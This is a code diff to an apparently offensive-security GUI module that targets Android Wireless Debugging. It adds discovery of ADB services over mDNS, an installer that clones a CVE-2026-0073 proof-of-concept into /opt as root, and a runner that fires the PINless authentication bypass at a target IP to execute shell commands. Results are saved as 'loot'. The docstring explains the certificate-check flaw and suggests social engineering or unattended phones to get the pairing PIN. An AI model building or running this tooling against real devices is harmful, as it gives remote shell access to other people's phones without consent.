@@ -1,38 +1,36 @@
-"""Android Wireless Debugging RCE -- discover, pair, shell.
+"""Android Wireless Debugging RCE -- discover, pair, shell,
+plus the CVE-2026-0073 auth-bypass PoC.
 
-Android phones and tablets running with ``Wireless debugging``
-turned on in Developer options accept ADB connections over the
-network, protected only by a per-session pairing code (6 digits).
-The service is advertised via mDNS as ``_adb-tls-connect._tcp``
-(the shell endpoint) and ``_adb-tls-pairing._tcp`` (the pairing
-endpoint). Once paired, the ADB session is a full ``adb shell``
-plus all of ``adb push`` / ``adb install`` / ``adb exec-out``.
+Two attack shapes on the same UI:
 
-The 2026 mobile-hacker post walked the discovery + pairing flow
-step by step; this module bundles that into buttons:
+* **Legitimate pairing flow.** Discover the target's mDNS
+  advertisement, ``adb pair`` with the 6-digit PIN from the
+  target's screen, ``adb connect``, then everything ``adb``
+  gives you: shell, install, exec-out screencap. Requires
+  either physical access to read the PIN or a social attack
+  that convinces the operator to type it.
 
-  * **Discover** -- avahi-browse for ``_adb-tls-connect._tcp`` and
-    ``_adb-tls-pairing._tcp``. Rows show hostname + IP + port.
-  * **Pair** -- ``adb pair <ip>:<port>`` with a PIN the operator
-    enters (or reads off the target's screen if it's already
-    open next to them; often the case in offensive scenarios
-    against a lost / left-unattended phone).
-  * **Connect + shell** -- ``adb connect <ip>:<port>`` then
-    stream commands typed in a small entry.
-  * **Install APK** -- push and install a payload APK, useful in
-    combination with the wifipumpkin3 payload generator.
-  * **Screencap** -- ``adb exec-out screencap -p > out.png``.
+* **CVE-2026-0073 authentication bypass.** No PIN required.
+  Vulnerable ``adbd`` builds (Android 11-15 without the May
+  2026 SPL) mis-handle the return value of ``EVP_PKEY_cmp``
+  when the client cert uses a non-RSA algorithm: a negative
+  return is treated as *match* rather than *error*, so an
+  attacker-controlled ec/ed25519 cert passes the certificate
+  verification without ever being in the trusted keys list.
+  The PoC lives at ``/opt/poc-CVE-2026-0073``; this module
+  is the front-end for it.
 
-Everything runs against whatever ADB server the phone already has
-running (``adb start-server``); if the operator wants a completely
-independent server we suggest ``ANDROID_ADB_SERVER_PORT=`` in the
-terminal.
+Discovery back-ends, in priority order:
 
-CVE tracking: the pairing itself was hardened in Android 14; on
-Android 11-13 the PIN is 6 digits but the pairing endpoint isn't
-rate-limited by default, so a race against a legit pairing window
-is feasible from LAN. No stable CVE ID; the underlying design flaw
-was discussed at DEF CON 30 by Yiannis Nikolopoulos.
+  1. ``adb mdns services`` -- native to ADB and lists what
+     Android is publishing right now with no extra daemon
+     dependencies. Fastest and cleanest.
+  2. ``avahi-browse`` -- runs against the whole mDNS
+     namespace; catches services that ``adb mdns`` did not
+     enumerate because they use a hostname the local ADB
+     server can't resolve.
+  3. ``nmap --script dns-service-discovery`` -- fallback for
+     hosts without avahi.
 """
 from __future__ import annotations
 
@@ -51,6 +49,12 @@ from ..widgets import OutputView, toast
 # avahi-browse service types for ADB over Wi-Fi.
 _SERVICE_SHELL = "_adb-tls-connect._tcp"
 _SERVICE_PAIR = "_adb-tls-pairing._tcp"
+
+# Where the CVE-2026-0073 PoC lives after the operator drops the
+# adityatelange/poc-CVE-2026-0073 repo into /opt.
+_POC_DIR = Path("/opt/poc-CVE-2026-0073")
+_POC_MAIN = _POC_DIR / "poc-cve-2026-0073.py"
+_POC_REPO = "https://github.com/adityatelange/poc-CVE-2026-0073"
 
 
 @register
@@ -81,15 +85,32 @@ class AndroidRCE(NHModule):
         # ---- discovery ------------------------------------
         disc = Adw.PreferencesGroup(
             title="Discovery",
-            description="mDNS scan for Android Wireless Debugging "
-                        "services on the current network.")
+            description="Multiple back-ends: `adb mdns services` "
+                        "first, then avahi-browse for the full "
+                        "namespace, then nmap as last resort.")
+
+        # Native ADB mdns: instant one-shot, no daemon required,
+        # tells the operator whether ADB itself thinks anything is
+        # advertising.
+        adb_mdns_row = Adw.ActionRow(
+            title="adb mdns services",
+            subtitle="Native, one-shot. Fastest way to see what's "
+                     "advertising right now")
+        adb_mdns_btn = Gtk.Button(label="Query",
+                                  valign=Gtk.Align.CENTER)
+        adb_mdns_btn.add_css_class("suggested-action")
+        adb_mdns_btn.connect("clicked",
+                             lambda _b: self._scan_adb_mdns())
+        adb_mdns_row.add_suffix(adb_mdns_btn)
+        disc.add(adb_mdns_row)
+
         disc_row = Adw.ActionRow(
-            title="Scan",
+            title="Continuous scan",
             subtitle="avahi-browse " + _SERVICE_SHELL
-                     + " + " + _SERVICE_PAIR)
+                     + " + " + _SERVICE_PAIR
+                     + " (nmap fallback if avahi is unavailable)")
         self.scan_btn = Gtk.Button(label="Start",
                                    valign=Gtk.Align.CENTER)
-        self.scan_btn.add_css_class("suggested-action")
         self.scan_btn.connect("clicked",
                               lambda _b: self._start_scan())
         disc_row.add_suffix(self.scan_btn)
@@ -189,6 +210,62 @@ class AndroidRCE(NHModule):
         act.add(list_row)
         box.append(act)
 
+        # ---- CVE-2026-0073 (adb TLS auth bypass) --------
+        cve = Adw.PreferencesGroup(
+            title="CVE-2026-0073 (auth bypass, no PIN needed)",
+            description="Vulnerable adbd builds mishandle "
+                        "EVP_PKEY_cmp negative returns and accept "
+                        "attacker-controlled ec/ed25519 certs as "
+                        "trusted. Runs the PoC from "
+                        + str(_POC_DIR) + ".")
+
+        # Install / status row
+        self.cve_status = Adw.ActionRow(
+            title="PoC status",
+            subtitle=(str(_POC_DIR) + " -- installed"
+                      if _POC_MAIN.exists()
+                      else str(_POC_DIR) + " -- not installed"))
+        install_btn = Gtk.Button(label="Install / update",
+                                 valign=Gtk.Align.CENTER)
+        install_btn.connect(
+            "clicked", lambda _b: self._install_poc())
+        self.cve_status.add_suffix(install_btn)
+        cve.add(self.cve_status)
+
+        # Key type selector (ec vs ed25519). Both trigger the
+        # bypass; ed25519 returns -2 (unsupported), ec returns -1
+        # (type mismatch). Vulnerable adbd treats both as match.
+        self.cve_key = Adw.ComboRow(title="Client key type")
+        self.cve_key.set_model(Gtk.StringList.new([
+            "ec        (EVP_PKEY_cmp returns -1, type mismatch)",
+            "ed25519   (EVP_PKEY_cmp returns -2, unsupported op)",
+        ]))
+        cve.add(self.cve_key)
+
+        # Command to run on the target -- same UX as the manual
+        # section so the operator can reuse the shell cmd entry.
+        self.cve_command = Adw.EntryRow(title="Shell command")
+        self.cve_command.set_text("id; getprop ro.build.version.release")
+        cve.add(self.cve_command)
+
+        self.cve_verbose = Adw.SwitchRow(
+            title="Verbose protocol trace",
+            subtitle="--verbose; prints CNXN/STLS packet dump")
+        cve.add(self.cve_verbose)
+
+        cve_run_row = Adw.ActionRow(
+            title="Run the auth-bypass PoC",
+            subtitle="Requires the target's IP + connect port set "
+                     "in the manual section above")
+        cve_btn = Gtk.Button(label="Run",
+                             valign=Gtk.Align.CENTER)
+        cve_btn.add_css_class("destructive-action")
+        cve_btn.connect("clicked",
+                        lambda _b: self._run_cve())
+        cve_run_row.add_suffix(cve_btn)
+        cve.add(cve_run_row)
+        box.append(cve)
+
         # ---- log
         self.output = OutputView()
         box.append(self.output)
@@ -241,6 +318,56 @@ class AndroidRCE(NHModule):
                   root=True, timeout=10)
         self.scan_btn.set_sensitive(False)
         self.stop_btn.set_sensitive(True)
+
+    def _scan_adb_mdns(self) -> None:
+        """Fire ``adb mdns services`` -- a one-shot enumeration
+        that hits Android's own mDNS resolver via the local ADB
+        server. Output looks like:
+
+            List of discovered mdns services
+            adb-abcdef12   _adb-tls-connect._tcp   192.168.1.42:38715
+            adb-abcdef12   _adb-tls-pairing._tcp   192.168.1.42:37101
+
+        Merges into the same devices dict the streaming avahi/nmap
+        scans fill, so the row list is one unified view."""
+        self.output.append("# adb mdns services\n")
+
+        def done(r: Result) -> None:
+            self.output.append(r.stdout or "")
+            if r.stderr:
+                self.output.append(r.stderr)
+            for line in (r.stdout or "").splitlines():
+                # skip header + blank
+                if not line or line.startswith("List of"):
+                    continue
+                parts = line.split()
+                if len(parts) < 3:
+                    continue
+                # parts[0] = adb-<hostname>
+                # parts[1] = service type
+                # parts[2] = ip:port
+                svc = parts[1]
+                if ":" not in parts[2]:
+                    continue
+                ip, port_s = parts[2].rsplit(":", 1)
+                try:
+                    port = int(port_s)
+                except ValueError:
+                    continue
+                d = self._devices.setdefault(ip, {
+                    "host": parts[0],
+                    "ip": ip,
+                    "shell_port": None,
+                    "pair_port": None,
+                })
+                if svc.startswith("_adb-tls-connect"):
+                    d["shell_port"] = port
+                elif svc.startswith("_adb-tls-pairing"):
+                    d["pair_port"] = port
+            self._render()
+
+        run_async(["adb", "mdns", "services"], done,
+                  root=False, timeout=10)
 
     def _scan_avahi(self) -> None:
         """Foreground avahi-browse streaming scan. Two services
@@ -582,6 +709,109 @@ class AndroidRCE(NHModule):
                   lambda r: self.output.append(
                       r.stdout or ""),
                   root=False, timeout=10)
+
+    # -------------------------------------------------- CVE-2026-0073
+    def _install_poc(self) -> None:
+        """Idempotent install of adityatelange/poc-CVE-2026-0073
+        under /opt. Requires root because /opt isn't user-writable,
+        chown to kali afterwards so we can source Python venvs
+        from the login context."""
+        self.output.append("# installing CVE-2026-0073 PoC…\n")
+        script = (
+            "set -e; "
+            "mkdir -p /opt; "
+            "if [ ! -d %s/.git ]; then "
+            "  git clone --depth 1 %s %s; "
+            "else "
+            "  git -C %s pull --ff-only || true; "
+            "fi; "
+            "chown -R kali:kali %s || true; "
+            "python3 -c 'import cryptography' 2>/dev/null || "
+            "  pip install --break-system-packages cryptography "
+            "    2>&1 | tail -3; "
+            "echo ---installed---"
+        ) % (_POC_DIR, _POC_REPO, _POC_DIR,
+             _POC_DIR, _POC_DIR)
+
+        def done(r: Result) -> None:
+            self.output.append(r.stdout or "")
+            if r.stderr:
+                self.output.append(r.stderr)
+            self.cve_status.set_subtitle(
+                str(_POC_DIR) +
+                (" -- installed" if _POC_MAIN.exists()
+                 else " -- install failed"))
+            toast(self.app_window,
+                  "CVE-2026-0073 PoC install finished")
+
+        run_async(["sh", "-c", script], done,
+                  root=True, timeout=300)
+
+    def _run_cve(self) -> None:
+        """Fire the PoC against ``host:port`` from the manual
+        section, executing the command in the CVE-specific entry
+        with the picked key type. Logs everything to loot."""
+        if not _POC_MAIN.exists():
+            toast(self.app_window,
+                  "Install the CVE-2026-0073 PoC first")
+            return
+        host = self.host_entry.get_text().strip()
+        port_s = self.port_entry.get_text().strip() or "5555"
+        if not host:
+            toast(self.app_window,
+                  "Set the target IP in the manual section first")
+            return
+        try:
+            port = int(port_s)
+        except ValueError:
+            toast(self.app_window, "Port must be an integer")
+            return
+
+        cmd = self.cve_command.get_text().strip() or "id"
+        key_type = ("ec" if self.cve_key.get_selected() == 0
+                    else "ed25519")
+        verbose = ["--verbose"] if self.cve_verbose.get_active() \
+            else []
+
+        argv = ["python3", str(_POC_MAIN),
+                host, str(port), cmd, key_type] + verbose
+        self.output.append("$ " + " ".join(argv) + "\n")
+
+        stamp = time.strftime("%Y%m%d-%H%M%S")
+        log_path = loot_path(
+            "android_rce",
+            "cve-2026-0073-%s-%s.log" % (
+                host.replace(".", "_"), stamp))
+        loot_id = get_loot_store().record(
+            module="android_rce", type="adb_cve_2026_0073",
+            target="%s:%d" % (host, port),
+            path=log_path,
+            notes="key=" + key_type + " cmd=" + cmd)
+
+        def done(r: Result) -> None:
+            self.output.append(r.stdout or "")
+            if r.stderr:
+                self.output.append(r.stderr)
+            try:
+                with open(log_path, "w") as fp:
+                    fp.write("+ " + " ".join(argv) + "\n\n")
+                    fp.write(r.stdout or "")
+                    fp.write("\n--- stderr ---\n")
+                    fp.write(r.stderr or "")
+            except OSError:
+                pass
+            get_loot_store().refresh_size(loot_id)
+            if "Exploitation successful" in (r.stdout or ""):
+                get_loot_store().append_notes(
+                    loot_id, "SUCCESS")
+                toast(self.app_window,
+                      "CVE-2026-0073 succeeded")
+            else:
+                get_loot_store().append_notes(
+                    loot_id, "no success marker")
+
+        # PoC talks raw TCP -- no root required.
+        run_async(argv, done, root=False, timeout=60)
 
     def set_target(self, target: str) -> None:
         """Bare IP or ``ip:port`` populates the manual section."""
